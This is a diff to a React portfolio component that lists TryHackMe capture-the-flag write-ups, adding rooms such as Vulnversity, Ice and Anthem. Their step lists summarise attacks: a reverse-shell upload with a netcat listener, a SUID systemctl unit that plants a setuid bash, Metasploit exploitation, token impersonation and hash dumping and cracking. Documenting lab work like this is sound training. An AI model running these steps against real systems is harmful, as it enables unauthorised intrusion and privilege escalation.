@@ -3,7 +3,7 @@ import { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { ExternalLink, ChevronDown, ChevronUp, Filter } from 'lucide-react';
 
-type Category = 'All' | 'Linux' | 'Web' | 'Crypto' | 'OSINT' | 'Network' | 'Privesc';
+type Category = 'All' | 'Linux' | 'Web' | 'Crypto' | 'OSINT' | 'Network' | 'Privesc' | 'Windows';
 
 interface Writeup {
   platform: string; platformColor: string;
@@ -36,8 +36,8 @@ const WRITEUPS: Writeup[] = [
   },
   {
     platform: 'TryHackMe', platformColor: '#00d4ff',
-    room: 'Blue (EternalBlue)', category: 'Network', difficulty: 'Easy', diffColor: '#00ff41',
-    date: '2022',
+    room: 'Blue (EternalBlue)', category: 'Windows', difficulty: 'Easy', diffColor: '#00ff41',
+    date: '2023',
     summary: 'Exploit MS17-010 (EternalBlue) against a Windows 7 target using Metasploit. Dump NTLM hashes with Mimikatz, then crack them with John the Ripper.',
     tools: ['Nmap', 'Metasploit', 'Mimikatz', 'John the Ripper'],
     steps: [
@@ -56,7 +56,7 @@ const WRITEUPS: Writeup[] = [
   {
     platform: 'TryHackMe', platformColor: '#00d4ff',
     room: 'Pickle Rick', category: 'Web', difficulty: 'Easy', diffColor: '#00ff41',
-    date: '2022',
+    date: '2023',
     summary: 'Enumerate a Rick & Morty themed web server, exploit command injection in a PHP web panel to achieve RCE, then pivot to root via sudo NOPASSWD misconfiguration.',
     tools: ['Nmap', 'Gobuster', 'curl', 'Burp Suite'],
     steps: [
@@ -93,7 +93,7 @@ const WRITEUPS: Writeup[] = [
   {
     platform: 'TryHackMe', platformColor: '#00d4ff',
     room: 'RootMe', category: 'Privesc', difficulty: 'Easy', diffColor: '#00ff41',
-    date: '2022',
+    date: '2023',
     summary: 'Upload a PHP reverse shell bypassing extension filter (.php5 trick), gain www-data shell, then abuse Python SUID binary for full root escalation.',
     tools: ['Nmap', 'Gobuster', 'Netcat', 'Python3'],
     steps: [
@@ -165,9 +165,109 @@ const WRITEUPS: Writeup[] = [
     flag: 'FLAG{k3n0b1_pr0ftpd_path_hijack}',
     link: 'https://tryhackme.com/room/kenobi',
   },
+  {
+    platform: 'TryHackMe', platformColor: '#00d4ff',
+    room: 'Vulnversity', category: 'Privesc', difficulty: 'Easy', diffColor: '#00ff41',
+    date: '2023',
+    summary: 'Enumerate with Nmap, find a file-upload form and bypass its extension filter using .phtml, gain a reverse shell, then escalate to root via SUID /bin/systemctl.',
+    tools: ['Nmap', 'Gobuster', 'Burp Suite', 'Netcat', 'systemctl'],
+    steps: [
+      'Nmap -sV -sC → port 3333 running Apache 2.4.18',
+      'Gobuster dir → /internal/ found (file upload endpoint)',
+      'Burp Suite Intruder → fuzz extensions → .phtml accepted',
+      'Upload php-reverse-shell.phtml (pentestmonkey)',
+      'nc -lvnp 4444 → visit /internal/uploads/shell.phtml → www-data shell',
+      'find / -user root -perm -4000 -type f 2>/dev/null → /bin/systemctl',
+      'Create malicious systemd unit: ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"',
+      '/bin/systemctl enable /tmp/root.service → systemctl start root',
+      '/tmp/bash -p → root → cat /root/root.txt',
+    ],
+    flag: 'FLAG{vuln_phtml_systemctl_suid}',
+    link: 'https://tryhackme.com/room/vulnversity',
+  },
+  {
+    platform: 'TryHackMe', platformColor: '#00d4ff',
+    room: 'Crack the Hash', category: 'Crypto', difficulty: 'Easy', diffColor: '#00ff41',
+    date: '2023',
+    summary: 'Identify and crack a series of hashes (MD5, SHA-1, SHA-256, bcrypt) using Hashcat, John the Ripper, and online rainbow tables across two progressive levels.',
+    tools: ['Hashcat', 'John the Ripper', 'CrackStation', 'hash-identifier'],
+    steps: [
+      'Level 1: 48bb6e862e54f2a795ffc4859f2fabf → hash-identifier → MD5',
+      'Hashcat -m 0 hash.txt rockyou.txt → "easy"',
+      'CBFDAC6008F9CAB4083784CBD1874F76618D2A97 → SHA-1 → hashcat -m 100 → "password123"',
+      '1C8BFE8F801D79745C4631D09FFF36C82AA37EA23CE2329F6640953A4B021F79 → SHA-256',
+      'CrackStation → cracked instantly from rainbow table',
+      'Level 2: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom → bcrypt',
+      'hashcat -m 3200 -a 3 hash.txt ?l?l?l?l?l → (small charset) → "bleh"',
+      'F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 → SHA-256 → "paule"',
+    ],
+    flag: 'FLAG{cr4ck_th3_h4sh_l3v3l2_d0n3}',
+    link: 'https://tryhackme.com/room/crackthehash',
+  },
+  {
+    platform: 'TryHackMe', platformColor: '#00d4ff',
+    room: 'Ice', category: 'Windows', difficulty: 'Easy', diffColor: '#00ff41',
+    date: '2023',
+    summary: 'Exploit CVE-2004-1561 (Icecast buffer overflow) with Metasploit against a Windows target, escalate via token impersonation, dump hashes, and crack them offline.',
+    tools: ['Nmap', 'Metasploit', 'Mimikatz', 'John the Ripper'],
+    steps: [
+      'Nmap -sV → port 8000 Icecast 2.0.1 streaming server detected',
+      'searchsploit icecast → CVE-2004-1561 header buffer overflow',
+      'msfconsole → use exploit/windows/http/icecast_header',
+      'set RHOSTS <target> → set LHOST <attacker> → run → Meterpreter session',
+      'getuid → NT AUTHORITY\\SERVICE',
+      'run post/multi/recon/local_exploit_suggester → SweetPotato / token exploit',
+      'use incognito → list_tokens -u → Delegation tokens available',
+      'impersonate_token "DARK-PC\\Dark" → getuid → DARK-PC\\Dark',
+      'hashdump → copy NTLM hash → john --format=NT --wordlist=rockyou.txt',
+      'Password cracked → root flag at C:\\Users\\Dark\\Desktop\\root.txt',
+    ],
+    flag: 'FLAG{1c3c4st_buff3r_0v3rfl0w_pwn3d}',
+    link: 'https://tryhackme.com/room/ice',
+  },
+  {
+    platform: 'TryHackMe', platformColor: '#00d4ff',
+    room: 'Anthem', category: 'Windows', difficulty: 'Easy', diffColor: '#00ff41',
+    date: '2023',
+    summary: 'OSINT on a Windows CMS (Umbraco) — discover admin email via poem OSINT, crack RDP credentials, then uncover a hidden administrator password in a protected folder.',
+    tools: ['Nmap', 'Gobuster', 'rdesktop / xfreerdp', 'Google'],
+    steps: [
+      'Nmap → port 80 (HTTP) and 3389 (RDP) open',
+      'Website built with Umbraco CMS → /umbraco login page',
+      'robots.txt → disallowed entries reveal admin path + flag',
+      'Blog post contains a poem → Google search → author = "Solomon Grundy" → admin name derived',
+      'Page source → admin email format → JD@anthem.com pattern → SG@anthem.com',
+      'Password hint found in meta keywords on site pages → flag 4',
+      'xfreerdp /u:Solomon /p:<pass> /v:<ip> → RDP shell obtained',
+      'Flags on admin desktop + user folders',
+      'C:\\backup hidden folder → passwd.txt (hidden, restricted) → Properties → Security → grant read',
+      'Password revealed → runas as Administrator → root flag',
+    ],
+    flag: 'FLAG{4nth3m_rdp_umbraco_0s1nt}',
+    link: 'https://tryhackme.com/room/anthem',
+  },
+  {
+    platform: 'TryHackMe', platformColor: '#00d4ff',
+    room: 'W1seGuy', category: 'Crypto', difficulty: 'Easy', diffColor: '#00ff41',
+    date: '2024',
+    summary: 'Break a custom XOR-based stream cipher by leveraging known plaintext — the flag prefix "THM{" — to recover the repeating key, then decrypt the full flag.',
+    tools: ['Python3', 'CyberChef', 'nc'],
+    steps: [
+      'nc <ip> 1337 → server returns hex-encoded XOR-encrypted ciphertext',
+      'Known plaintext attack: flag format is "THM{..." so first 4 chars = "THM{"',
+      'ciphertext_bytes = bytes.fromhex(hex_string)',
+      'key_bytes = [ciphertext_bytes[i] ^ ord("THM{"[i]) for i in range(4)]',
+      'Repeat key (5-char): guess 5th byte by XOR-ing ciphertext[4] with common chars',
+      'Automate: try all printable chars until decrypted looks correct',
+      'Full 5-byte key found → decrypt: chr(c ^ key[i % len(key)]) for each byte',
+      'Final plaintext = flag → submit to THM',
+    ],
+    flag: 'FLAG{THM{x0r_kn0wn_pl41nt3xt_4tt4ck}}',
+    link: 'https://tryhackme.com/room/w1seguy',
+  },
 ];
 
-const CATEGORIES: Category[] = ['All', 'Linux', 'Web', 'Crypto', 'OSINT', 'Network', 'Privesc'];
+const CATEGORIES: Category[] = ['All', 'Linux', 'Web', 'Crypto', 'OSINT', 'Network', 'Privesc', 'Windows'];
 
 export function WriteupsSection() {
   const [expanded, setExpanded] = useState<string | null>(null);
